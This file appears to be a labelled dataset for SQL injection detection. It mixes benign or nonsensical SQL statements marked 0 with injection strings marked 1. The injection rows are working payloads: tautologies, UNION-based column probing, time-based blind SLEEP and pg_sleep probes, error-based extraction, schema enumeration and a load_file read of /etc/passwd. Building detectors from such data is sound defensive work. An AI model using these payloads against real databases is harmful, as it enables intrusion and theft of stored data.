SELECT ran ( s )  FROM rising UNION ALL;0
"DELETE FROM logs WHERE user_id = 123;";0
"UPDATE employees SET email = 'john@example.com' WHERE description = 'user123';";0
SELECT even,winter,various,team,two     (  (  needle JOIN wet ON example.carry =  would.worker )   INNER JOIN nearbyON Orders.feel =  clay.magicID ) ;0
-8963  )   where 8528  =  8528 or   (  2470  =  3271  )  *3271--;1
1'||  (  select 'ymwf' where 1229  =  1229 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||';1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i;1
SELECT look ( s FROM mostly RIGHT JOIN;0
"-5230""  )   or elt  (  1032  =  1032,3623  )   and   (  ""aivb"" like ""aivb";1
1'  )   as rbpx where 1264  =  1264;1
select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   ;1
1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ;1
SELECT sent, which+ ', ' + useful+ ' ' + section+ ', ' + spread AS region  FROM cattle;0
"UPDATE employees SET status = 'john@example.com' WHERE quantity = 456;";0
-2028'   )    )     )   union all select 8698,8698,8698,8698#;1
SELECT sheet,human FROM lunch WHERE apartment = 'unless' UNION SELECT accurate, coat FROM unknown;0
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#;1
INSERT INTO boy  ( goose, offer, slabs )  VALUES  ( 'particularly', 'course', 'exact' )  ;0
SLEEP(5)=';1
1%'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #;1
SELECT smallest ( s )  FROM key UNION ALL;0
"1%""   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --";1
"SELECT status, price, description, created_at FROM logs WHERE created_at = 'user123';";0
"DELETE FROM logs WHERE quantity = 456;";0
" end and    (    (   ""%""  =  """;1
SELECT * FROM riding WHERE    NOT work = 'known';0
1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  'ylit' like 'ylit;1
"UPDATE sessions SET price = 'pending' WHERE created_at = '2023-01-01';";0
"1%""   )    )    or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --";1
"admin"" or 1  =  1#";1
1'   )    )    as pgif where 6346  =  6346;1
SELECT value,section,touch,aware,air     (  (  wise JOIN fully ON box.exchange =  careful.respect )   INNER JOIN noneON Orders.brick =  paper.richID ) ;0
UNION ALL SELECT 1,2,3,4#;1
"1""  )   as lrew where 6067  =  6067 union all select null,null,null,null,null,null,null#";1
1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #;1
-1432 order by 1#;1
1'+  (  select pxsd where 2576  =  2576 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   +';1
" select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1";1
1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb;1
SELECT * FROM stone WHERE mile = 'pound' FETCH FIRST 3 ROWS ONLY;0
"DELETE FROM customers WHERE quantity = 'john@example.com';";0
1'   )    )     )   and 4595  =  4595#;1
"select sleep  (  5  )   and    (    (   ""vzye""  =  ""vzye";1
SELECT * FROM rubber FETCH FIRST 3 ROWS ONLY;0
1'   )    )    as qaki where 5272  =  5272;1
"UPDATE employees SET id = 'user123' WHERE email = 'Sample text';";0
SELECT COUNT ( especially ) , crew FROM soldier BY height;0
"SELECT quantity FROM logs WHERE description = 'user123';";0
1' and make_set  (  3445  =  5963,5963  )   and 'wjfw'  =  'wjfw;1
1' where 5004  =  5004 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
" select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1";1
ORDER BY 16#;1
1'  )   as ibqr where 5372  =  5372 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --;1
-9739' or 8571  =  8571--;1
)   or pg_sleep  (  __TIME__  )  --;1
"UPDATE inventory SET description = 'user123' WHERE email = 456;";0
" select * from users where id  =  1 or ""%,"" or 1  =  1 -- 1";1
SELECT ridingID AS ID, husband AS related FROM explain;0
-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#;1
"1""  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""liar""  =  ""liar";1
1'  )   where 8776  =  8776 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --;1
"-1048%"" or 3038  =  3038";1
SELECT * FROM settlers WHERE decide LIKE '%trace%';0
SELECT * FROM deeply;0
SELECT within ( s )  FROM map UNION ALL;0
-8153'  )   as qhlb where 4948  =  4948 union all select 4948,4948,4948,4948,4948,4948#;1
1%'   )    )    and sleep  (  5  )  #;1
"SELECT name, user_id, email FROM customers WHERE status = 'john@example.com';";0
1   )    )    as zdbj where 2300  =  2300   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --;1
"SELECT email, name FROM sessions WHERE description = '2023-01-01';";0
1 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  -- ybmz;1
1 union all select null,null,null,null,null--;1
1'+  (  select lhtn where 8484  =  8484 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +';1
"1""   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (     (  ""tabq"" like ""tabq";1
select case when 8867  =  7630 then 1 else null end--;1
"SELECT quantity FROM users WHERE email = 'john@example.com';";0
select * from users where id  =  '1' union select ,@@VERSION -- 1';1
`;1
SELECT * FROM fly WHERE nails = 'layers' FETCH FIRST 3 ROWS ONLY;0
select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1;1
SELECT TOP 50 PERCENT * FROM across;0
)   or sleep  (  __TIME__  )    =  ';1
"UPDATE users SET user_id = 'user123' WHERE name = 123;";0
" select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1";1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i;1
' or 'x'='x;1
SELECT * FROM weather WHERE NOT stay = 'just'  AND NOT concerned = 'respect';0
1 and sleep  (  5  )  -- ruuv;1
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ;1
1'||  (  select 'adoe' from dual where 7662  =  7662;1
s;1
-5744  )   union all select 3617,3617,3617,3617,3617,3617--;1
1 or pg_sleep(5)--;1
-4970'  )   union all select 4625,4625,4625,4625,4625,4625,4625,4625#;1
1'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ;1
SELECT COUNT ( special ) FROM west;0
AND 1=0--;1
AND 7506=9091 AND (5913=5913;1
1 and make_set  (  8403  =  8403,8899  )  ;1
"1%""  )   union all select null,null,null,null,null,null,null,null,null,null--";1
"INSERT INTO users (user_id, email, price, status) VALUES ('Sample text', 'pending', 'pending', 'pending');";0
SELECT known ( s )  FROM usually;0
1' in boolean mode  )   or sleep  (  5  )  #;1
select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn;1
select * from users where id  =  1 <@.. or 1  =  1 -- 1;1
1',  (  case when 5204  =  2136 then 1 else null end  )  ;1
SELECT * FROM explore WHERE turn = 'general' LIMIT 3;0
SELECT TOP 50 PERCENT * FROM travel SELECT * FROM usual FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM stop;0
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20;1
1'   )    )     )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --;1
"1"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""zcfa""  =  ""zcfa";1
1   )    )    as dnwj where 2961  =  2961 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --;1
1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #;1
"INSERT INTO logs (id, created_at) VALUES ('active', 456);";0
SELECT * FROM slave ORDER BY wire;0
"1""  )   as buky where 7898  =  7898 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --";1
1%'   )    )     )   and 2006  =  2006;1
"1"" union all select null,null,null#";1
SELECT private ( s )  FROM nor UNION;0
AND 1083=1083 AND ('1427=1427;1
"DELETE FROM inventory WHERE id = 456;";0
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--;1
1'+  (  select syrz where 7699  =  7699 union all select null,null,null#;1
1   )    )    as cusv where 4871  =  4871 and elt  (  1210  =  1210,sleep  (  5   )    )   --;1
"SELECT price, created_at, description, quantity FROM orders WHERE created_at = 123;";0
select * from users where id  =  1.<@. or 1  =  1 -- 1;1
-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  ';1
INSERT INTO naturally ( stretch, foreign, found, beside, experience, push )  VALUES  ( 'saw', 'finest'. globe', 'older', 'former', 'record', 'boy' )  ;0
SELECT * FROM  ( SELECT porch FROM complete ) ;0
1   )    )    or pg_sleep  (  __TIME__  )  --;1
select * from users where id  =  '1' or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1';1
OR 1=1;1
SELECT * FROM rays WHERE cap NOT LIKE '[instrument]%';0
"UPDATE orders SET name = '2023-01-01' WHERE quantity = 'active';";0
select * from users where id  =  1 or <. union select 1,@@VERSION -- 1;1
"1"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""okpa""  =  ""okpa";1
-9772' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'igaa'  =  'igaa;1
1  )   where 6990  =  6990 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --;1
-9156'   )    )    union all select 9110,9110,9110,9110#;1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#;1
"1%""  )   rlike sleep  (  5  )  #";1
-9145%'   )    )     )   or make_set  (  9017  =  9368,9368  )   and    (    (     (  '%'  =  ';1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;";1
"1""  )   as frmp where 6073  =  6073";1
SELECT * FROM design WHERE smoke  BETWEEN 10 AND 20;0
UPDATE motor SET traffic = 'tobacco'WHERE east = 'species';0
1   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  7589  =  7589;1
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  7079  =  7079;1
"1""   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""vcjt"" like ""vcjt";1
end and    (    (   'eqoc' like 'eqoc;1
-2748'   )    )    as gazw where 4624  =  4624 union all select 4624,4624#;1
1'  )   where 7640  =  7640 and make_set  (  8978  =  8594,8594  )  --;1
SELECT * FROM sky WHERE such NOT LIKE 'pitch%';0
1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'kpsg' like 'kpsg;1
1'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ;1
SELECT driverID AS ID, string AS year FROM event;0
admin'/*;1
-1192 order by 1#;1
"1""  )   as zhlf where 4119  =  4119 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --";1
(  select top 1;1
SELECT * FROM rhyme WHERE slipped = 'lucky' FETCH FIRST 3 ROWS ONLY;0
1%' and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  ';1
SELECT goose ( s )  FROM actual LEFT JOIN;0
select case when 4537  =  8418 then 1 else null end--;1
SELECT TOP 50 PERCENT * FROM widely;0
select * from users where id  =  1 or < union select 1,@@VERSION -- 1;1
AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=';1
"1""  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""piya""  =  ""piya";1
1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null--;1
SELECT * FROM ship WHERE title BETWEEN '1996-07-01' AND '1996-07-31';0
1' where 9003  =  9003 and make_set  (  5868  =  8316,8316  )  --;1
1' where 8770  =  8770 union all select null--;1
"SELECT status FROM customers WHERE price = 'pending';";0
SELECT * FROM smile WHERE finally = 'generally'  OR engineer = 'adventure';0
select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1;1
"SELECT price FROM customers WHERE id = 'user123';";0
select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   -- sztf;1
SELECT * FROM inside  WHERE fear NOT LIKE '[zulu]%';0
SELECT TOP 50 PERCENT * FROM eventually;0
"DELETE FROM sessions WHERE user_id = 'Sample text';";0
SELECT COUNT ( coal ) , sink FROM act BY several;0
" end and ""mdje"" like ""mdje";1
"SELECT * FROM attack WHERE walk BETWEEN ""jet"" AND    ""dog""";0
"""  )   or benchmark  (  10000000,MD5  (  1   )    )   #";1
SELECT * FROM dress WHERE memory NOT BETWEEN 'knowledge' AND 'broke';0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""%""  =  """;1
SELECT AVG ( mistake )  FROM principal  SELECT SUM ( opinion ) ;0
SELECT * FROM action WHERE broad = 'fight' LIMIT 3;0
1'||  (  select 'uedk' where 4655  =  4655;1
1   )    )    as huxq where 7451  =  7451 union all select null,null,null--;1
"UPDATE products SET id = 'john@example.com' WHERE price = 'active';";0
"UPDATE customers SET user_id = 'pending' WHERE email = 'pending';";0
SELECT * FROM eventually 3 SELECT * FROM fifth;0
ORDER BY 19#;1
-5021'+  (  select yadq where 4285  =  4285 order by 1#;1
"-7813""   )    )    as yvyl where 5172  =  5172 union all select 5172,5172#";1
SELECT pack,ourselves,dirty,church,basket     (  (  nice JOIN couple ON fur.made =  blood.still )   INNER JOIN answerON Orders.slipped =  nine.fearID ) ;0
select * from information_schema.tables--;1
1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'zpzf'  =  'zpzf;1
SELECT COUNT ( voyage ) , idea FROM sad BY test;0
ORDER BY 14#;1
"-4785""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #";1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#;1
1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh;1
SELECT AVG ( hurt ) FROM diagram SELECT SUM ( blood ) ;0
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#;1
"SELECT description FROM users WHERE price = 'pending';";0
select case when 7649  =  9297 then 1 else null end--;1
1'   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'skdm'  =  'skdm;1
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--;1
"DELETE FROM employees WHERE email = 'pending';";0
select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1;1
1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'hfqz'  =  'hfqz;1
SELECT TOP 3 * FROM each SELECT * FROM oil 3SELECT * FROM behind;0
SELECT * FROM combine WHERE stone = 'basic'  AND  ( open = 'proper' OR spent = 'leather' ) ;0
"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #";1
1'  )   as irnj where 7274  =  7274 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --;1
UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--;1
SELECT COUNT ( son ) FROM remarkable;0
"admin"" or 1=1#";1
1 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  # mafe;1
";%00	Nullbyte";1
